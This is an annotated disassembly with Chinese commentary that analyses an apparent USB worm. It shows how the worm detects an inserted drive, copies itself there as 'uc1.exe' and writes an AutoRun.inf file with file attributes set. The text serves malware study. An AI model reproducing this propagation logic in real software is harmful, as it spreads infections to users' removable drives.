
004012CF       |.  75 20       jnz     short 004012F1  

004012D1       |.  8D5424 00   lea     edx, dword ptr [esp]  

004012D5       |.  50          push    eax                 ; /ShowState  

004012D6       |.  52          push    edx                 ; |CmdLine  

004012D7       |.  FF15 607040>call    dword ptr [<&KERNEL32.WinEx>; \WinExec  

；以隐藏的方式执行  

004012DD       |.  8B8424 0801>mov     eax, dword ptr [esp+108]  

004012E4       |.  6A 00       push    0                   ; /lParam = 0  

004012E6       |.  6A 00       push    0                   ; |wParam = 0  

004012E8       |.  6A 10       push    10                  ; |Message = WM_CLOSE  

004012EA       |.  50          push    eax                 ; |hWnd  

004012EB       |.  FF15 147140>call    dword ptr [<&USER32.SendMes>; \SendMessageA  

004012F1       |>  33C0        xor     eax, eax  

004012F3       |.  81C4 040100>add     esp, 104  

004012F9       \.  C3          retn  

；有输入设备信息  

004011CB   > \8B4424 10     mov     eax, dword ptr [esp+10]       ;  Case 219 (WM_DEVICECHANGE) of switch 00401104；  

；查了一下 MSDN，响应 WM_DEVICECHANGE 这个消息的函数声明如下  

；LRESULT CALLBACK WindowProc(  

；  HWND hwnd,       // handle to window  

；  UINT uMsg,       // WM_DEVICECHANGE  

；WPARAM wParam,    // device-change event  

；  LPARAM lParam    // event-specific data  

；);  

004011CF   .  8B4C24 0C     mov     ecx, dword ptr [esp+C]  

004011D3   .  8B5424 04     mov     edx, dword ptr [esp+4]  

004011D7   .  50           push    eax  ；lParam  

004011D8   .  51           push    ecx  ; wParam  

004011D9   .  52           push    edx  ； hwnd  

；因为 uMsg 是默认为 WM_DEVICECHANGE，所以只有三个参数  

004011DA   .  E8 F1FEFFFF   call    004010D0  

`WM_DEVICECHANGE` 的说明如下：  

当 Windows 系统的硬件设置发生变化时,系统将会向所有应用程序发送一条 `WM_DEVICECHANGE` 消息.当有设备被禁止或激活时(比如我们插入光盘,从光驱中取出光盘,或者在系统设备中删除或禁止打印端口),该消息的 `wParam` 参数分别被指定为 `DBT_DEVICEARRIVAL`(设备安装完毕)和 `DBT_DEVICEREMOVECOMPLETE`(设备移除完毕),根据这两个参数可以判断闪存是否存在,`lParam` 参数指向一 `DEV_BROADCAST_HDR` 结构,该结构中的 `dbch_deviacetype` 成员是变化设备的类型,当该值为 `DBT_DEVTYP_VOLUME` 时,表明一个带有卷标名的驱动器发生了变化  

（出处：http://sogoodm.com/soft/t5/16303-63858.html ）  

004010D0  /$  817C24 08 008>  cmp     dword ptr [esp+8], 8000 ；比较是否插入了新的设备，8000 是宏 `DBT_DEVICEARRIVAL` 的值，表示系统插入了一个新设备，相关的定义在 Include\DBT.h 头文件里（我的是 VC6），顺便说一句，查这个 8000 表示什么就查了半天，非常郁闷！！！  

004010D8  |.  75 20         jnz     short 004010FA ；如果不是插入新设备就跳  

004010DA  |.  8B4424 0C     mov     eax, dword ptr [esp+C]  

004010DE  |.  8378 04 02    cmp     dword ptr [eax+4], 2 ；  

004010E2  |.  75 16         jnz     short 004010FA  

004010E4  |.  8B40 0C       mov     eax, dword ptr [eax+C]  

004010E7  |.  50           push    eax  

004010E8  |.  E8 03010000   call    004011F0 ；获取 U 盘的盘符  

；枚举 26 个驱动器，通过查看哪个发生了变化来获取 U 盘的盘符  

004011F0  /$  8B4C24 04     mov     ecx, dword ptr [esp+4]  

004011F4  |.  32C0          xor     al, al ；从 0 开始比较  

004011F6  |>  F6C1 01       /test    cl, 1  

004011F9  |.  75 08         |jnz     short 00401203  

004011FB  |.  D1E9          |shr     ecx, 1  

004011FD  |.  FEC0          |inc     al  

004011FF  |.  3C 1A         |cmp     al, 1A ；比较是否已达到了 26  

00401201  |.^ 7C F3         \jl      short 004011F6  

00401203  |>  83C0 41       add     eax, 41 ；用盘符的索引加上‘A’得到盘符的字母注意 41 是 16 进制，转化为 10 进制就是 ASC 码‘A’  

00401206  \.  C3           retn  

004010ED  |.  83C4 04       add     esp, 4  

004010F0  |.  A2 5C8A4000   mov     byte ptr [408A5C], al  

004010F5  |.  E8 D6020000   call    004013D0 ；  

；把自身复制到 U 盘并且在 U 盘下创建一个 autorun.inf 文件  

004013D0  /$  81EC 08020000 sub     esp, 208  

004013D6  |.  8D8424 040100>lea     eax, dword ptr [esp+104]  

004013DD  |.  56           push    esi  

004013DE  |.  57           push    edi  

004013DF  |.  8B3D 14704000 mov     edi, dword ptr [<&KERNEL32.lstrc>;  kernel32.lstrcpyA  

004013E5  |.  68 5C8A4000   push    00408A5C                 ; /String2 = "B"  

004013EA  |.  50           push    eax                    ; |String1  

004013EB  |.  FFD7         call    edi                    ; \lstrcpyA  

004013ED  |.  8B35 10704000 mov     esi, dword ptr [<&KERNEL32.lstrc>;  kernel32.lstrcatA  

004013F3  |.  8D8C24 0C0100>lea     ecx, dword ptr [esp+10C]  

004013FA  |.  68 90804000   push    00408090                 ; /StringToAdd = "\"  

004013FF  |.  51           push    ecx                    ; |ConcatString  

00401400  |.  FFD6         call    esi                    ; \lstrcatA  

00401402  |.  8B15 40804000 mov     edx, dword ptr [408040]      ;  auto.00408068  

00401408  |.  8D8424 0C0100>lea     eax, dword ptr [esp+10C]  

0040140F  |.  52           push    edx                    ; /StringToAdd => "uc1.exe"  

00401410  |.  50           push    eax                    ; |ConcatString  

00401411  |.  FFD6         call    esi                    ; \lstrcatA  

00401413  |.  8D4C24 08     lea     ecx, dword ptr [esp+8]  

00401417  |.  68 5C8A4000   push    00408A5C                 ; /String2 = "B"  

0040141C  |.  51           push    ecx                    ; |String1  

0040141D  |.  FFD7         call    edi                    ; \lstrcpyA  

0040141F  |.  8D5424 08     lea     edx, dword ptr [esp+8]  

00401423  |.  68 90804000   push    00408090                 ; /StringToAdd = "\"  

00401428  |.  52           push    edx                    ; |ConcatString  

00401429  |.  FFD6         call    esi                    ; \lstrcatA  

0040142B  |.  A1 48804000   mov     eax, dword ptr [408048]  

00401430  |.  8D4C24 08     lea     ecx, dword ptr [esp+8]  

00401434  |.  50           push    eax                    ; /StringToAdd => "AutoRun.inf"  

00401435  |.  51           push    ecx                    ; |ConcatString  

00401436  |.  FFD6         call    esi                    ; \lstrcatA  

00401438  |.  8D5424 08     lea     edx, dword ptr [esp+8]  

0040143C  |.  52           push    edx  

0040143D  |.  E8 BEFEFFFF   call    00401300     ；检测文件是否存在  

00401442  |.  83C4 04       add     esp, 4  

00401445  |.  85C0         test    eax, eax  

00401447  |.  5F           pop     edi  

00401448  |.  5E           pop     esi  

00401449  |.  75 17         jnz     short 00401462  

0040144B  |.  8D4424 00     lea     eax, dword ptr [esp]  

0040144F  |.  50           push    eax  

00401450  |.  E8 5B000000   call    004014B0 ；在 U 盘创建一个 autorun.inf 文件  

00401455  |.  8D4C24 04     lea     ecx, dword ptr [esp+4]  

00401459  |.  51           push    ecx  

0040145A  |.  E8 C1FEFFFF   call    00401320 ；设置文件的属性  

0040145F  |.  83C4 08       add     esp, 8  

00401462  |>  8D9424 040100>lea     edx, dword ptr [esp+104]  

00401469  |.  52           push    edx  

0040146A  |.  E8 91FEFFFF   call    00401300 ；检查文件是否存在  

0040146F  |.  83C4 04       add     esp, 4  

00401472  |.  85C0         test    eax, eax  

00401474  |.  75 2B         jnz     short 004014A1  

00401476  |.  50           push    eax                 ; /FailIfExists  

00401477  |.  8D8424 080100>lea     eax, dword ptr [esp+108]        ; |  

0040147E  |.  50           push    eax                 ; |NewFileName  

0040147F  |.  68 608A4000   push    00408A60                 ; |ExistingFileName = ""  

00401484  |.  FF15 34704000 call    dword ptr [<&KERNEL32.CopyFileA>>; \CopyFileA  

0040148A  |.  8D8C24 040100>lea     ecx, dword ptr [esp+104]  

00401491  |.  51           push    ecx ；U 盘文件的路径  

00401492  |.  E8 89FEFFFF   call    00401320 ；设置文件的属性  

00401497  |.  83C4 04       add     esp, 4  

0040149A  |.  81C4 08020000 add     esp, 208  

004014A0  |.  C3           retn  

004014A1  |>  33C0         xor     eax, eax  
